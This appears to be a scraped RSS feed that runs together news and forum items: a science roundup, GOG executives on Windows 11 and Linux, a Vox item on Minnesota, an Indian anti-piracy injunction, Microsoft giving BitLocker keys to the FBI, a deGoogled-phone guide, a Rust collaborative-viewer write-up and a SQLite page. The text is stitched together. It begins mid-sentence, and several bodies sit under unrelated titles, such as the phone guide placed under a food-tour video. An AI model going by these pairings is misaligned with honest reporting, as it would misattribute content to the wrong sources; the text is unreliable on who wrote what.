still roamed our world.Zoo animals get long in the toothSpeaking of really old stuff, there has been much consternation of late about falling birth rates and aging populations in many nations around the world. As it turns out, similar demographic anxieties are playing out in zoos across Europe and North America, where mammal populations “have, on average, become older and less reproductively active” according to a new study.  On the one hand, this is good news because it signals improvements in the health and longevity of mammals in zoos, reflecting a long-term effort to transform zoos into conservation hubs as opposed to sites of spectacle. But it also “fundamentally jeopardizes the long-term capacity of zoos to harbor insurance populations, facilitate reintroductions of threatened species, and simply maintain a variety of self-sustaining species programs,” said researchers led by João Pedro Meireles of the University of Zurich. This story struck me because of my many childhood visits to see an Asian elephant named Lucy, who was the star of the Edmonton Valley Zoo when I was young (I am now old). I recently learned Lucy is still chilling there at the ripe old age of 50! This is positively Methuselan for a zoo elephant, though it is not an unusual age for them in the wild. Lucy is the perfect poster child (or rather, poster senior) for this broader aging effect. Long may she reign.Bust out the bursty bulk flowWe’ll close with a reminder that the planet Mercury exists. It can be easy to overlook this tiny rock, which is barely bigger than the Moon. But Mercury is dynamic and full of surprises, according to a study based on close flybys of the planet by BepiColombo, a collaborative space mission between Europe and Japan, which is tasked with cracking this mercurial nut.BepiColombo zoomed just over 100 miles above Mercury’s surface in October 2021, June 2022, and June 2023, but each encounter revealed distinct portraits of the planet’s magnetosphere, which is a magnetic bubble that surrounds some planets, including Earth.“These flybys all passed from dusk to dawn through the nightside equatorial region but were noticeably different from each other,” said researchers led by Hayley N. Williamson of the Swedish Institute of Space Physics. “Specifically, we see energetic ions in the second and third flybys that are not there in the first.”“We conclude that these ions are part of a phenomenon called bursty bulk flow, which also happens at Earth,” the team concluded. Bursty bulk flow, in addition to being a fun phrase to say outloud, are intense, transient jets in a magnetosphere that drive energetic particles toward the planet, and are driven by solar activity. BepiColombo is on track to scooch into orbit around Mercury this November, where it will continue to study the planet up close for years, illuminating this world of extremes. In my hierarchy of Mercurys, the planet sits above the Ford brand, the 80th element, and the Roman god, with only Freddie surpassing it. So, it’s good to see it getting the attention it deserves.  Thanks for reading!

It's such poor-quality software and product, and I'm so surprised that it's [spent] so many years on the market. I can't believe it!"And the managing director observed that Linux was "one of the things that we've put in our strategy for this year to look closer at"We've heard from a pair of the top execs behind GOG – a popular gaming platform focused on classic titles, hence the acronym 'Good Old Games' – and they made some withering comments about Windows 11, as well as dropping hints about how Linux is going to become more important for GOG in 2026.The execs in question are the new owner of GOG, Michał Kiciński, and the managing director, Maciej Gołębiewski, who were interviewed by PC Gamer.Our sister site asked about the backlash against Windows 11 – which has reached new heights since Microsoft started pushing AI even harder in the OS late last year – and the increasing interest in Linux as a result (which was already sparked by the success of SteamOS on handhelds).Kiciński said, "I'm really surprised at Windows. It's such poor-quality software and product, and I'm so surprised that it's [spent] so many years on the market. I can't believe it!"Kiciński doesn't run Windows 11, you may not be surprised to learn – he uses macOS – but does have to fix the PCs of his parents sometimes.The owner further explained, "I sometimes have to fix my mum's computer or my father's computer with Windows, [and] like, it's unbelievable… So I'm not surprised that people gravitate outside of the Windows ecosystem."It was Gołębiewski, however, who dropped the big hint about Linux, when questioned on gamers embracing it as an alternative to Microsoft's OS.The managing director said that Linux was "one of the things that we've put in our strategy for this year to look closer at", but refused to elaborate further, noting, "I don't want to commit to any specifics, but certainly you will see this trend, and we also see that Linux is close to the hearts of our users, so we probably could do better on that front, and that's something that we'll be looking at."Analysis: Linux is building up steam (or is it the other way round?)That compact device could be a landmark moment for easy and convenient living room gaming, potentially, and so given all this, it's no real surprise that GOG would be looking at Linux more closely for 2026 – and beefing up support for games on this platform.What's a bit more surprising is the heat that Windows 11 takes here, with the owner of GOG pulling no punches in the assessment of Microsoft's OS. Of course, part of what's "unbelievable" for Kiciński is how Windows is "such poor-quality software" given that it's been on the market for over 30 years now. (And indeed it's existed longer than that, but not as a full-blown operating system, just as an interface overlay on top of DOS).He is, of course, not isolated in firing flak at Windows 11, which was seen as a step back from Windows 10 by many. Mainly because the performance of the newest OS was lacking compared to its predecessor in some respects – particularly with search and File Explorer, and it still is to this day – plus a bunch of features got dropped with Windows 11 (although a good few have been added back since the OS launched in 2021).]]></content:encoded></item><item><title>What would Minnesota look like under the Insurrection Act? #shorts</title><link>https://www.youtube.com/shorts/tzg1FWpVzOo</link><author>Vox</author><category>yt</category><enclosure url="https://www.youtube.com/v/tzg1FWpVzOo?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 13:01:40 +0000</pubDate><source url="https://www.youtube.com/channel/UCLXo7UDZvByw2ixzpQCufnA">Vox</source><content:encoded><![CDATA[President Donald Trump has threatened to use the Insurrection Act to send active-duty troops to Minnesota, something that the state’s attorney general, Keith Ellison, told Vox’s Astead Herndon would be “extremely problematic.”

Thousands of immigration officers are patrolling the streets of Minneapolis, leading to the death of one anti-ICE protester, Renee Nicole Good, and setting off a massive swirl of protests. 

Vice President JD Vance visited Minneapolis late this week — showing his support for law enforcement, and sending a political message at the same time: that this White House is doubling down on its war against blue cities, and Minneapolis specifically.

Now, President Trump has subpoenaed the state’s top Democratic officials, alleging they were impeding federal immigration enforcement actions. The Justice Department has promised to arrest anyone who impedes the immigration enforcement actions, and a Trump official accused some state officials of “terrorism.” With Minnesota now in a full-blown conflict with the Trump administration, the Democratic state leadership is front and center in the standoff.

In this video episode of Vox’s Today, Explained podcast, host Astead Herndon interviews Minnesota Attorney General Keith Ellison about the Somali fraud scandal that first brought on the ICE surge in his state. Did Democratic officials do enough to staunch the fraud? What more could they have done to cut the fraud off at its knees? And now that ICE is in Minnesota, what more can they do? Are the courts the only recourse, if President Trump does as he has been threatening, and invokes the Insurrection Act?

The injunction targets notorious pirate sites, requesting blockades at Indian ISPs. More crucially, however, globally operating domain registrars, including U.S. companies, are also compelled to take action. However, despite earlier cooperation, most don't seem eager to comply. [...] As reported by Verdictum a few days ago, the High Court in New Delhi issued a new blocking injunction on December 18, targeting more than 150 pirate site domains, including yflix.to, animesuge.bz, bs.to, and many others.
 
The complaint (PDF) is filed by Warner Bros., Apple, Crunchyroll, Disney, and Netflix, which are all connected to the MPA's anti-piracy arm, ACE. The referenced works include some of the most pirated titles, such as Stranger Things, Squid Game, and Silo. In addition to targeting Indian ISPs, the order also lists various domain name registries and related organizations as defendants. This includes American registrars such as Namecheap and GoDaddy, but also the government of the Kingdom of Tonga, which is linked to .to domains. By requiring domain name registrars to take action, the Indian court orders have a global impact.
 
In addition to suspending the domain names within three days days, the domain name registrars are given four weeks to disclose the relevant subscriber information connected to these domains. "[The registrars] shall lock and suspend Defendant Nos. 1 to 47 websites within 72 hours of being communicated with a copy of this Order and shall file all the Basic Subscriber Information, including the name, address, contact information, email addresses, bank details, IP logs, and any other relevant information [...] within four weeks of being communicated with a copy of this Order," the High Court wrote. While the "Dynamic+" injunction is designed to be a global kill switch, its effectiveness depends entirely on the cooperation of the domain name registrars. Since most of these are based outside of India, their compliance is not guaranteed.]]></content:encoded></item><item><title>Microsoft will give the FBI a Windows PC data encryption key if ordered</title><link>https://www.windowscentral.com/microsoft/windows-11/microsoft-bitlocker-encryption-keys-give-fbi-legal-order-privacy-nightmare</link><author>blacktulip</author><category>hn</category><pubDate>Sat, 24 Jan 2026 12:55:22 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Microsoft has confirmed in a statement to Forbes that the company will provide the FBI access to BitLocker encryption keys if a valid legal order is requested. These keys enable the ability to decrypt and access the data on a computer running Windows, giving law enforcement the means to break into a device and access its data.The news comes as Forbes reports that Microsoft gave the FBI the BitLocker encryption keys to access a device in Guam that law enforcement believed to have "evidence that would help prove individuals handling the island’s Covid unemployment assistance program were part of a plot to steal funds" in early 2025.This was possible because the device in question had its BitLocker encryption key saved in the cloud. By default, Windows 11 forces the use of a Microsoft Account, and the OS will automatically tie your BitLocker encryption key to your online account so that users can easily recover their data in scenarios where they might get locked out. This can be disabled, letting you choose where to save them locally, but the default behavior is to store the key in Microsoft's cloud when setting up a PC with a Microsoft Account."While key recovery offers convenience, it also carries a risk of unwanted access, so Microsoft believes customers are in the best position to decide... how to manage their keys,” Microsoft spokesperson Charles Chamberlayne said in a statement to Forbes.Microsoft told Forbes that it receives around 20 requests for BitLocker encryption keys from the FBI a year, but the majority of requests are unable to be met because the encryption key was never uploaded to the company's cloud.This is notable as other tech companies, such as Apple, have famously refused to provide law enforcement with access to encrypted data stored on their products. Apple has openly fought against the FBI in the past when it was asked to provide a backdoor into an iPhone. Other tech giants, such as Meta, will store encryption keys in the cloud, but use zero-knowledge architectures and encrypt the keys server-side so that only the user can access them.It's frankly shocking that the encryption keys that do get uploaded to Microsoft aren't encrypted on the cloud side, too. That would prevent Microsoft from seeing the keys, but it seems that, as things currently stand, those keys are available in an unencrypted state, and it is a privacy nightmare for customers.To see Microsoft so willingly hand over the keys to encrypted Windows PCs is concerning, and should make everybody using a modern Windows computer think twice before backing up their keys to the cloud. You can see which PCs have their BitLocker keys stored on Microsoft's servers on the Microsoft Account website here, which will let you delete them if present.]]></content:encoded></item><item><title>Meet the Writer: Nan Ei Ei Kyaw on Choosing the Right Vector DB</title><link>https://hackernoon.com/meet-the-writer-nan-ei-ei-kyaw-on-choosing-the-right-vector-db?source=rss</link><author>Nan Ei Ei</author><category>tech</category><pubDate>Sat, 24 Jan 2026 12:53:57 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[Nan Ei Ei shares her journey from embedded systems to AI engineering, her approach to writing practical developer guides, and how real-world constraints shape production-ready RAG systems.]]></content:encoded></item><item><title>[MEDIA][TUI] try-rs - A project/experiment organizer that makes life much easier.</title><link>https://www.reddit.com/r/rust/comments/1qlm834/mediatui_tryrs_a_projectexperiment_organizer_that/</link><author>/u/_allsafe_</author><category>rust</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 12:53:02 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[   submitted by    /u/_allsafe_ ]]></content:encoded></item><item><title>Why High Accuracy Isn’t Enough for Production AI Systems</title><link>https://hackernoon.com/why-high-accuracy-isnt-enough-for-production-ai-systems?source=rss</link><author>CIZO</author><category>tech</category><pubDate>Sat, 24 Jan 2026 12:40:20 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[High-accuracy AI systems often fail in real-world usage because human behavior introduces noise that benchmarks don’t capture.

Is it possible? I am going in the wrong direction trying to solve this problem?EDIT: After many hours I finally was able to achieve the quality I was seeking for:For anyone interested, the key was in how many pixels a cell on the terminal has (terminals are composed of cells, these are like little containers composed at the same time of a tiny canvas of pixels. If I am mistaken, please correct me without any problem), then multiply the value with the current width/height of my widget to get the pixel target for the images. This and using a better set of features that the go-termimg and imaging packages offer made the final shift.Now I have to see if the quality changes with different terminal sizes and different widget composition for the library. Thanks!]]></content:encoded></item><item><title>Adana Türkiye Food tour Day 4 part 2</title><link>https://www.youtube.com/shorts/1iFHDlEo4yI</link><author>Middle Eats</author><category>yt</category><enclosure url="https://www.youtube.com/v/1iFHDlEo4yI?version=3" length="" type=""/><pubDate>Sat, 24 Jan 2026 12:30:03 +0000</pubDate><source url="https://www.youtube.com/channel/UCWj_rUMGYCP0DjffybE2nbg">Middle Eats</source><content:encoded><![CDATA[Adana Türkiye Food tour Day 4 part 2

That said, we must include one honorary mention: . GrapheneOS is an Android OS that  runs on Google’s Pixel phones. But as the Android Source Tree for Google’s Pixels is no longer open source, the GrapheneOS team is looking to adapt the OS to other phones - which will make it a hot contender for this article.Even now, GrapheneOS is a great choice when freeing yourself from the tracking of Google apps as it’s an alternative open source operating system, and well known for its focus on security and privacy, for instance it has a hardened memory safety and exploit mitigation. However, even if you do not use any Google apps on your Pixel device powered by GrapheneOS, you still hold a Google phone in your hand, having paid money to Google when buying it. That’s why GrapheneOS is not included in this review, but it must be noted that it’s one of the most secure operating systems out there.GrapheneOS exists to provide a high level of privacy and security. GrapheneOS only connects to GrapheneOS servers by default with a lot of control over that. GrapheneOS provides far stronger exploit protections making it impossible to exploit a large subset of remote vulnerabilities and far harder to exploit nearly all of the rest.”Practical notes for deGoogled phonesObviously, when choosing a deGoogled phone, you will not want to get your apps from Google Play. Fortunately, there are great app store alternatives such as F-Droid, Aurora, and App Lounge in /e/OS that you can use instead. Sometimes it will be necessary to sideload your favorite Android app, meaning you need to get it directly from an app developers website as they offer their apps only via Google Play and not the alternatives. It can get complicated with apps such as banking apps that heavily rely on Google Play for Android, but some phone makers offer workarounds for this. It’s also possible that Google-dependent functionalities such as push notifications handled by Google’s FCM will not work on your deGoogled smartphone.When it comes to security and privacy, it’s important to also think about security updates and patches. Some of the here reviewed operating systems for deGoogled Android phones are criticized for being slow on delivering critical security patches. When it comes to patching security vulnerabilities quickly, GrapheneOS is the best one.But now, let’s look into the top five phones, designed in Europe, to free yourself from the Google ecosystem!The Volla Quintus is the best choice when you want a multi-boot experience. It’s an Android powered by  VollaOS (with multi-boot option) or Ubuntu Touch.If you already get most of your apps from F-Droid or Aurora, you will have no issue switching to the Volla Quintus with VollaOS. The operating system is based on the open source Android (AOSP) and runs without any Google-dependency. Optionally, you can enable microG to improve compatibility for apps that rely on Google Play Services. Without this, some apps like banking apps may not work or have limited features (especially when it comes to push notifications or security checks). Volla phones are developed and sold in Germany; the hardware is partially manufactured in Asia, but final and decisive production steps takes place in Germany.CEO Dr. Jörg Wurzer says:A smartphone or tablet is a complex product with a complex supply chain. In our case, it starts with the chipset manufacturer Mediatek in Taiwan, continues via the board designer and the respective component suppliers to us in Remscheid. The final and decisive production steps take place in Germany. This includes final assembly or engraving, but above all the installation of the firmware and finally packaging and sealing at our site in Remscheid. For some models, we also use manufacturing capacities for assembling the device in Bocholt. Volla OS is developed and built on our self-managed servers located in Germany and Finland. We also manage the servers for the OTA (over the air) update. By the way, the display of the Volla Phone Quintus uses tempered Schott Alpha glass.”We are gradually expanding our production capacities in Germany and now even have production capacities in Remscheid for small series of components, initially for accessories. We have now largely switched from commercial goods to our own products manufactured in Germany for the accessories. Felt cases from Bavaria, cables from Mecklenburg-Western Pomerania, and screen protectors also from North Rhine-Westphalia. Some suppliers are even located in the neighborhood as we like to keep sourcing as local as possible.”Optional compatibility to Google Play Services and Google Play IntegrityVolla OS (Android-based) or Ubuntu Touch (mobile Linux) or both with multi boot on Volla OSVolla OS focuses on safety & device encryption with unique security modeSimple, smart and minimalist UI for distraction free usageSome Google-dependent apps will require extra stepsUbuntu Touch has a much smaller native app ecosystemFlagship (Volla Quintus) - key specs8 GB RAM | 256 GB storagePowerful Mediatek Dimensity 7050 8-core processorThe Volla Quintus is a great phone if you want a deGoogled phone with a special eye on quality and nice haptics. With its focus on security and encryption, you can get a Google-free phone that’s not only free from any tracking, but also keeps your data safe and protected. On your Quintus, you can use lots of the deGoogled apps that we recommend; for instance, Tuta Mail runs very nicely on Quintus. And since the Tuta apps do not use Google Push, you can even receive email and calendar notifications on your deGoogled smartphone. Yet, you still have the option to enable Google Play compatibility if you realize that you are not yet ready to leave Google completely. In addition to its security, the Volla Quintus comes with minimalist distraction which gives you the good feeling of freedom and safety.The deGoogled Volla Quintus costs €719, and you can buy it here with 10% discount by entering the gift code VOLLA10 on check-out.The Fairphone (Gen. 6) is your future phone if you want hardware longevity and the
possibility to deGoogle – with the option to go back to Google if deGoogling turns out to
be too much of a challenge. Fairphone is a Dutch company that has been around since 2013. The unique selling point of Fairphones is the focus on longevity and repairability. The company promises wants to offer an alternative to use-and-throw consumerism by encouraging you to use your phones longer. That’s why Fairphones get a long warranty and are built modular, with12 modular parts that can be easily swapped without having to get an entirely new phone when something stops working.When using Fairphone with Google’s Android, you can get all your apps from Google Play without any limitation. To use a deGoogled Fairphone, you can order it with /e/OS preinstalled. While you will then not be able to get your apps from Google Play, /e/OS offers its own app store called App Lounge that gives you access to lots of apps you would find on Google Play plus Google-alternative apps. You can also sideload apps, for instance you can get the Tuta apps directly from the download section of our website. While most apps are fully compatible and run normally on your deGoogled phone, it’s not a guarantee for all apps that are out there, especially banking and government apps. If your app is not compatible on /e/OS, you might need to explore an alternative way to access it, such as via browser.Promises long warranty, extended software support and easy DIY repairability with 12

You can always try going deGoogled, but if it doesn’t work out, you can always install an Android OS or any other custom ROM you like.You can get a deGoogled Fairphone (Gen. 6) for €649 here.The SHIFTphone suits you best if you want modular, user-serviceable hardware with strong custom-ROM / Google-free options. Any SHIFTphone can be used with ShiftOS-G which is based on Google’s standard Android and comes with Google apps pre-installed. This means it will not be a Google-free phone, but all Android apps, even if you use a niche banking app, will work. You can also choose to use the lightly deGoogled variant, ShiftOS-L, which is also based on Google’s Android, but comes without any Google apps and has F-Droid preinstalled for installing your favorite apps like Tuta Mail and Tuta Calendar, all available on F-Droid, of course.You can also use the ShHIFTphone with /e/OS preinstalled. By choosing this operating system, you’ll have an alternative to minimize your reliance on Google services and enhance your digital privacy. The e-Foundation website provides further information on the Murena SHIFTphone and resources for those interested in exploring this privacy-focused mobile operating system.SHIFT designs its phones in Germany, but they are manufactured and assembled in China under fair production policies monitored by the company. Similar to Fairphone, SHIFT has a strong focus on longevity and repairability, and it is sometimes recommended as a Fairphone alternative.Modular, user-replaceable parts (battery, modules)Focus on long-term ownershipOfficial support for alternative OS installations; e.g. /e/OSHardware is a bit older (e.g. Snapdragon 845 on SHIFT6mq), so performance for heavy tasks may be less performantRemovable battery, deep modularity (screws, replaceable modules)Strong emphasis on repairability and component traceabilityFlagship (SHIFTphone 8.1) - key specsSoC: Qualcomm QCM6490 (industrial platform, based on Snapdragon 778G)RAM / Storage: 12 GB LPDDR RAM / 512 GB internal storage (microSDXC expandable up to 2 TB)Display: 6.67” AMOLED, Full HD+User-replaceable universal battery (compatible with SHIFT6m, SHIFT6mq, SHIFTkeys with adapter)Dual 50 MP + 50 MP (pixel binning, 4K video)Hardware kill switches for camera & microphoneSHIFT lets you easily explore a deGoogled phone with the option to go back to the standard Google Android OS in case you find that the limitations caused by disabling all Google functionalities too frustrating. The  SHIFT6mq is a solid phone from Germany, giving you the option to quit US tech and choose European products.You can buy the SHIFTphone 8.1 for €651 here.A Punkt phone is the best option for you if you want a simple, privacy-centric device with a Google-free OS out of the box with built-in privacy tooling. Punkt phones with Apostrophy OS are designed to be simple and secure which is good for users who want a straightforward privacy-first phone without having to tinker with the phone too much. Going completely Google-free always comes with some limitations in app compatibility, and the Punkt phone is no exception in this. For certain apps, you may need to use web versions or alternatives. As Apostrophy OS is a Google-free fork of Android with privacy focus, it does not include Google Play Services by default and apps that require Google services might be limited in functionality (no push noticiations) or not work at all. To solve this issue, some people report that they were able to use sandboxed Play Store equivalents, but this requires manual tinkering. The Punkt. MC02 is developed in Switzerland, but assembled and manufactured by partner companies in China.Punkt ships Google-free smartphones with Apostrophy OSIntegrated privacy defaults and optional paid VPN/service packagesVendor focuses on “less data, less tracking”Hardware is mid-range: Punkt emphasizes privacy and simplicity over bleeding-edge specsSome reviewers note a dimmer display and software limitations for power usersdeGoogled OS: Apostrophy OS (privacy-first fork)Integrated privacy featuresSimple UX with curated app choicesFlagship (Punkt.

MC02 with Apostrophy OS is a 100% deGoogled smartphone with all its benefits and limitations that go along with it. It is a nice alternative and can be bought for €499 here.Murena is the parent company of /e/OS, headquartered in France. Murena does not produce phones itself, but sells a variety of the deGoogled phones reviewed above with /e/OS preinstalled. When getting a smartphone from Murena, you can set it up Google-free. Plus, Murena’s app store App Lounge is already preinstalled on these devices, which according to Murena is “the most integrated de-Google experience available in Europe”.You can get deGoogled smartphones with /e/OS from vendors such as Volla, Fairphone, and Shift here.The smartphones presented here already come with an alternative Android OS that does not depend on Google’s Android OS. There are more replacements for Google’s Android, and you can install them yourself on all kinds of phones. As mentioned, there is GrapheneOS for Pixel phones, but there’s even more. /e/OS (based on LineageOS) is a popular OS to go Google-free, but we’ve talked about this enough already. The same with Volla OS for Volla phones which has been described in detail.Then there’s also LineageOS. This is a community project, meaning the OS is developed by the open source community, free for anyone. Many forks depend on LineageOS so that vendors like Murena continuously support the development of this operating system. LineageOS has a very large community and is well-maintained, but it needs to be set up manually by someone who knows a thing or two about smartphones.Now is the time to free yourself from Google completely!]]></content:encoded></item><item><title>[Media] PathCollab: optimizing Rust backend for a real-time collaborative pathology viewer</title><link>https://www.reddit.com/r/rust/comments/1qlkp3q/media_pathcollab_optimizing_rust_backend_for_a/</link><author>/u/Psychological-Ad5119</author><category>rust</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 11:30:17 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I built PathCollab, a self-hosted collaborative viewer for whole-slide images (WSI). The server is written in Rust with Axum, and I wanted to share some of the technical decisions that made it work.As a data scientist working with whole-slide images, I got frustrated by the lack of web-based tools capable of smoothly rendering WSIs with millions of cell overlays and tissue-level heatmaps. In practice, sharing model inferences was especially cumbersome: I could not self-deploy a private instance containing proprietary slides and model outputs, generate an invite link, and review the results live with a pathologist in an interactive setting. There exist some alternatives but they typically do not allow to render millions of polygons (cells) smoothly.WSIs are huge (50k x 50k pixels is typical, some go to 200k x 200k). You can't load them into memory. Instead of loading everything at once, you serve tiles on demand using the Deep Zoom Image (DZI) protocol, similar to how Google Maps works.I wanted real-time collaboration where a presenter can guide followers through a slide, with live cursor positions and synchronized viewports. This implies:Tile serving needs to be fast (users pan/zoom constantly)Cursor updates at 30Hz, viewport sync at 10HzSupport for 20+ concurrent followers per sessionCell overlay queries on datasets with 1M+ polygonsFirst, I focus on the cursor updates.Each connection spawns three tasks:rust // Connection state cached to avoid session lookups on hot paths pub struct Connection { pub id: Uuid, pub session_id: Option<String>, pub participant_id: Option<Uuid>, pub is_presenter: bool, pub sender: mpsc::Sender<ServerMessage>, // Cached to avoid session lookups on every cursor update pub name: Option<String>, pub color: Option<String>, } The registry uses  instead of  for lock-free concurrent access:rust pub type ConnectionRegistry = Arc<DashMap<Uuid, Connection>>; pub type SessionBroadcasters = Arc<DashMap<String, broadcast::Sender<ServerMessage>>>; I replaced the RwLock<HashMap<…>> used to protect the ConnectionRegistry with a DashMap after stress-testing the server under realistic collaborative workloads. In a setup with 10 concurrent sessions (1 host and 19 followers each), roughly 200 users were continuously panning and zooming at ~30 Hz, resulting in millions of cursor and viewport update events per minute.Profiling showed that the dominant bottleneck was lock contention on the global RwLock: frequent short-lived reads and writes to per-connection websocket broadcast channels were serializing access and limiting scalability. Switching to DashMap alleviated this issue by sharding the underlying map and reducing contention, allowing concurrent reads and writes to independent buckets and significantly improving throughput under high-frequency update patterns.Each session (a session is one presenter presenting to up to 20 followers) gets a  for fan-out. The broadcast task polls with a 100ms timeout to handle session changes:rust match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await { Ok(Ok(msg)) => { /* forward to client */ } Ok(Err(RecvError::Lagged(n))) => { /* log, continue */ } Err(_) => { /* timeout, check if session changed */ } } For cursor updates (the hottest path), I cache participant name/color in the Connection struct. This avoids hitting the session manager on every 30Hz cursor broadcast.Metrics use an RAII guard pattern so latency is recorded on all exit paths:```rust struct MessageMetricsGuard { start: Instant, msg_type: &'static str, }impl Drop for MessageMetricsGuard { fn drop(&mut self) { histogram!("pathcollab_ws_message_duration_seconds", "type" => self.msg_type) .record(self.start.elapsed()); } } ```Avoiding the hot path: tile caching strategyWhen serving tiles via the DZI route, the expensive path is: OpenSlide read -> resize -> JPEG encode. On a cache miss, this takes 200-300ms. Most of the time is spent on the libopenslide library actually reading bytes from the disk, so I could not do much to optimize the hot path. On a cache hit, it's ~3ms.So the goal became clear: avoid this path as much as possible through different layers of caching.Layer 1: In-memory tile cache (moka)I started by caching encoded JPEG bytes (~50KB) in a 256MB cache. The weighter function counts actual bytes, not entry count.```rust pub struct TileCache { cache: Cache<TileKey, Bytes>, // moka concurrent cache hits: AtomicU64, misses: AtomicU64, }let cache = Cache::builder() .weigher(|_key: &TileKey, value: &Bytes| -> u32 { value.len().min(u32::MAX as usize) as u32 }) .max_capacity(256 * 1024 * 1024) // 256MB .time_to_live(Duration::from_secs(3600)) .time_to_idle(Duration::from_secs(1800)) .build(); ```Layer 2: Slide handle cache with probabilistic LRUOpening an OpenSlide handle is expensive. I cache handles in an  that maintains insertion order for O(1) LRU eviction:rust pub struct SlideCache { slides: RwLock<IndexMap<String, Arc<OpenSlide>>>, metadata: DashMap<String, Arc<SlideMetadata>>, access_counter: AtomicU64, } Updating LRU order still requires a write lock, which kills throughput under load. So I only update LRU position 1 in 8 times:```rust pub async fn get_cached(&self, id: &str) -> Option<Arc<OpenSlide>> { let slides = self.slides.read().await; if let Some(slide) = slides.get(id) { let slide_clone = Arc::clone(slide); // Probabilistic LRU: only update every N accesses let count = self.access_counter.fetch_add(1, Ordering::Relaxed); if count % 8 == 0 { drop(slides); let mut slides_write = self.slides.write().await; if let Some(slide) = slides_write.shift_remove(id) { slides_write.insert(id.to_string(), slide); } } return Some(slide_clone); } None This is technically imprecise but dramatically reduces write lock contention. In practice, the "wrong" slide getting evicted occasionally is fine.Layer 3: Cloudflare CDN for the online demoAs I wanted to setup a public web demo (it's here ), I rented a small Hetzner instance CPX22 (2 cores, 4GB RAM) with fast NVMe SSD. I was concerned that my server would be completely overloaded by too many users. In fact, when I initially tested the deployed app , I quickly realized that ~20% of my requests had a 503 Service Temporarily Available response. Even with the 2 layers of cache above, the server was still not able to serve all these tiles.I wanted to experiment with Cloudflare CDN (never used before). Tiles are immutable (same coordinates always return the same image), so I added cache headers to the responses:rust (header::CACHE_CONTROL, "public, max-age=31536000, immutable") For the online demo at pathcollab.io, Cloudflare sits in front and caches tiles at the edge. The first request hits the origin, subsequent requests from the same region are served from CDN cache. This is the biggest win for the demo since most users look at the same regions.Here are the main rules that I set:Name: Bypass dynamic endpointsExpression Preview: bash (http.request.uri.path eq "/ws") or (http.request.uri.path eq "/health") or (http.request.uri.path wildcard r"/metrics*") Indeed, we do not want to cache anything on the websocket route.Expression Preview: bash (http.request.uri.path wildcard r"/api/slide/*/tile/*") This is the most important rule, to relieve the server from serving all the tiles requested by the clients.The slow path: At first, I inserted blocking I/O instructions (using OpenSlide to read bytes from disk) between two await instructions. After profiling and researching on Tokio's forums, I realized this is a big no-no, and that I/O blocking code inside async code should be wrapped inside a Tokio's  task.I referred to Alice Ryhl's blogpost on how long a task is to be considered blocking. Simply put, tasks taking more than 100ms are considered blocking. This was clearly the case for OpenSlide with non-sequential reads typically taking 300 to 500ms.Therefore, for the "cache-miss" route, the CPU-bound work runs in : ```rust let result = tokio::task::spawn_blocking(move || { // OpenSlide read (blocking I/O) let rgba_image = slide.read_image_rgba(&region)?; histogram!("pathcollab_tile_phase_duration_seconds", "phase" => "read") .record(read_start.elapsed());// Resize with Lanczos3 (CPU-intensive) let resized = image::imageops::resize(&rgba_image, target_w, target_h, FilterType::Lanczos3); histogram!("pathcollab_tile_phase_duration_seconds", "phase" => "resize") .record(resize_start.elapsed()); // JPEG encode encode_jpeg_inner(&resized, jpeg_quality) R-tree for cell overlay queriesMoving on to the routes serving cell overlays. Cell segmentation overlays can have 1M+ polygons. When the user pans, the client sends a request with the (x, y) coordinate of the top left of the viewport, as well as the height and width. This allows me to query efficiently the cell polygons lying inside the user viewport (if not already cached on the client side) using the  crate with bulk loading:```rust pub struct OverlaySpatialIndex { tree: RTree<CellEntry>, cells: Vec<CellMask>, }pub struct CellEntry { pub index: usize, // Index into cells vector pub centroid: [f32; 2], // Spatial key }impl RTreeObject for CellEntry { type Envelope = AABB<[f32; 2]>;fn envelope(&self) -> Self::Envelope { AABB::from_point(self.centroid) } Query is O(log n + k) where k is result count:```rust pub fn query_region(&self, x: f64, y: f64, width: f64, height: f64) -> Vec<&CellMask> { let envelope = AABB::from_corners( [x as f32, y as f32], [(x + width) as f32, (y + height) as f32] );self.tree .locate_in_envelope(&envelope) .map(|entry| &self.cells[entry.index]) .collect() As a side note, the index building runs in  since parsing the cell coordinate overlays (stored in a Protobuf file) and building the R-tree for 1M cells takes more than 100ms.On my M1 MacBook Pro, with a 40,000 x 40,000 pixel slide, PathCollab (run locally) gives the following numbers:Cursor broadcast (20 clients)Cell query (10k cells in viewport)The cache hit rate after a few minutes of use is typically 85-95%, so most tile requests are sub-millisecond.I hope you liked this post. I'm happy to answer questions about any of these decisions. Feel free to suggest more ideas for an even more efficient server, if you have!]]></content:encoded></item><item><title>MWC Barcelona 2026 Passes?</title><link>https://www.reddit.com/r/kubernetes/comments/1qlkk1h/mwc_barcelona_2026_passes/</link><author>/u/Naturesscape</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 11:22:00 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Hey guys, I found a guy who is selling official MWC Barcelona 2026 passes at a reasonable price.

Many Small Queries Are Efficient In SQLite

200 SQL statements per webpage is excessive for client/server database
engines like MySQL, PostgreSQL, or SQL Server.


But with SQLite, 200 or more SQL statement per webpage is not a problem.


SQLite can also do large and complex queries efficiently, just like
client/server databases.  But SQLite can do many smaller queries
efficiently too.  Application developers can use whichever technique
works best for the task at hand.
     

The Appropriate Uses For SQLite page says that
dynamic pages on the SQLite website typically do about 200 SQL
statements each.
This has provoked criticism from readers.  Examples:

"200 SQL statements is a ridiculously high number for a single page""For most sites, 200 queries is way, way, way too much."
Such criticism would be well-founded for a traditional client/server
database engine, such as MySQL, PostgreSQL, or SQL Server.  In
a client/server database, each SQL statement requires a message
round-trip from the application to the database server and back to
the application.  Doing over 200 round-trip messages, sequentially,
can be a serious performance drag.  This is sometimes called the
"N+1 Query Problem" or the "N+1 Select Problem" and it is an anti-pattern.


SQLite is  client/server, however.  The SQLite database runs
